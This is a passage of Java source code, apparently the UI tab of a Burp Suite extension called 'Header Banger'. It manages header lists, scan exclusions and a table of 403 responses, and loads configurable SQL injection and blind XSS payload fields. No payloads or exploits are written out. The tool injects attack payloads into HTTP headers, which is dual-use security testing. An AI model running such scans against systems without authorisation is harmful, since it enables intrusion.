                    if (exclusion.getPattern().equals(existingPattern)) {
                        exists = true;
                        break;
                    }
                }
                
                if (!exists) {
                    exclusionsTableModel.addRow(new Object[]{
                        exclusion.isEnabled(),
                        exclusion.getPattern()
                    });
                    
                    exclusionsTable.revalidate();
                    exclusionsTable.repaint();
                    exclusionsTableModel.fireTableDataChanged();
                    
                    api.logging().logToOutput("[HeaderBangerTab] Successfully added exclusion to table. New row count: " + exclusionsTableModel.getRowCount());
                } else {
                    api.logging().logToOutput("[HeaderBangerTab] Exclusion already exists in table: " + exclusion.getPattern());
                }
            });
        } else {
            api.logging().logToOutput("[HeaderBangerTab] Cannot add to table - table model or table is null");
        }
    }
    
    public void refreshAllLists() {
        refreshHeadersList();
        refreshSensitiveHeadersList();
        refreshExtraHeadersList();
        refreshExclusionsTable();
        refresh403AlertsTable();
        refreshPayloadFields();
        updateAttackModeButtons();
    }
    
    public void refresh403AlertsTable() {
        if (alert403TableModel != null) {
            alert403TableModel.setRowCount(0);
            for (Alert403Entry entry : extension.getAlert403Entries()) {
                alert403TableModel.addRow(new Object[]{
                    entry.getMethod(),
                    entry.getHost(),
                    entry.getPathQuery(),
                    entry.getStatusCode(),
                    entry.getSource()
                });
            }
            
            if (alert403Table != null) {
                alert403Table.revalidate();
                alert403Table.repaint();
            }
        }
    }
    
    private void showAlert403ContextMenu(MouseEvent e) {
        int clickedRow = alert403Table.rowAtPoint(e.getPoint());
        if (clickedRow >= 0) {
            // If clicked row is not selected, select only that row
            if (!alert403Table.isRowSelected(clickedRow)) {
                alert403Table.setRowSelectionInterval(clickedRow, clickedRow);
            }
            
            int[] selectedRows = alert403Table.getSelectedRows();
            if (selectedRows.length > 0) {
                JPopupMenu contextMenu = new JPopupMenu();
                
                // Get unique hosts and URLs from all selected rows
                Set<String> uniqueHosts = new HashSet<>();
                Set<String> uniqueUrls = new HashSet<>();
                
                for (int row : selectedRows) {
                    String host = (String) alert403TableModel.getValueAt(row, 1);
                    String pathQuery = (String) alert403TableModel.getValueAt(row, 2);
                    String url = "https://" + host + pathQuery;
                    
                    uniqueHosts.add(host);
                    uniqueUrls.add(url);
                }
                
                // Exclude hosts menu item
                String hostText = selectedRows.length == 1 ? 
                    "Exclude Host from Header Banger scans" : 
                    "Exclude " + uniqueHosts.size() + " Host(s) from Header Banger scans";
                    
                JMenuItem excludeHostItem = new JMenuItem(hostText);
                excludeHostItem.addActionListener(_ -> {
                    int excludedCount = 0;
                    StringBuilder excludedHosts = new StringBuilder();
                    
                    for (String host : uniqueHosts) {
                        if (!extension.isExcluded("", host)) {
                            extension.addHostExclusion(host);
                            excludedCount++;
                            if (excludedHosts.length() > 0) excludedHosts.append(", ");
                            excludedHosts.append(host);
                        }
                    }
                    
                    if (excludedCount > 0) {
                        String message = excludedCount == 1 ? 
                            "Host " + excludedHosts.toString() + " has been excluded from Header Banger scans." :
                            excludedCount + " host(s) have been excluded from Header Banger scans: " + excludedHosts.toString();
                        JOptionPane.showMessageDialog(null, message, "Exclusions Added", JOptionPane.INFORMATION_MESSAGE);
                    } else {
                        JOptionPane.showMessageDialog(null, "All selected hosts are already excluded.", "No Changes", JOptionPane.INFORMATION_MESSAGE);
                    }
                });
                contextMenu.add(excludeHostItem);
                
                // Exclude URLs menu item  
                String urlText = selectedRows.length == 1 ? 
                    "Exclude URL from Header Banger scans" : 
                    "Exclude " + uniqueUrls.size() + " URL(s) from Header Banger scans";
                    
                JMenuItem excludeUrlItem = new JMenuItem(urlText);
                excludeUrlItem.addActionListener(_ -> {
                    int excludedCount = 0;
                    
                    for (String url : uniqueUrls) {
                        if (!extension.isExcluded(url, "")) { // Check if not already excluded
                            extension.addUrlExclusion(url);
                            excludedCount++;
                        }
                    }
                    
                    if (excludedCount > 0) {
                        String message = excludedCount == 1 ? 
                            "URL has been excluded from Header Banger scans." :
                            excludedCount + " URL(s) have been excluded from Header Banger scans.";
                        JOptionPane.showMessageDialog(null, message, "Exclusions Added", JOptionPane.INFORMATION_MESSAGE);
                    } else {
                        JOptionPane.showMessageDialog(null, "All selected URLs are already excluded.", "No Changes", JOptionPane.INFORMATION_MESSAGE);
                    }
                });
                contextMenu.add(excludeUrlItem);
                
                contextMenu.show(alert403Table, e.getX(), e.getY());
            }
        }
    }
    
    public void refreshPayloadFields() {
        if (sqliPayloadField != null) {
            sqliPayloadField.setText(extension.getSqliPayload());
        }
        if (bxssPayloadField != null) {
            bxssPayloadField.setText(extension.getBxssPayload());
        }
    }
    
    public void refreshHeadersList() {
        if (headersListModel != null) {
            headersListModel.clear();
            extension.getHeaders().forEach(headersListModel::addElement);
        }
    }
    
    public void refreshSensitiveHeadersList() {
        if (sensitiveHeadersListModel != null) {
            sensitiveHeadersListModel.clear();
            extension.getSensitiveHeaders().forEach(sensitiveHeadersListModel::addElement);
        }
    }
    
    public void refreshExtraHeadersList() {
        if (extraHeadersListModel != null) {
            extraHeadersListModel.clear();
            extension.getExtraHeaders().forEach(extraHeadersListModel::addElement);
        }
    }
} 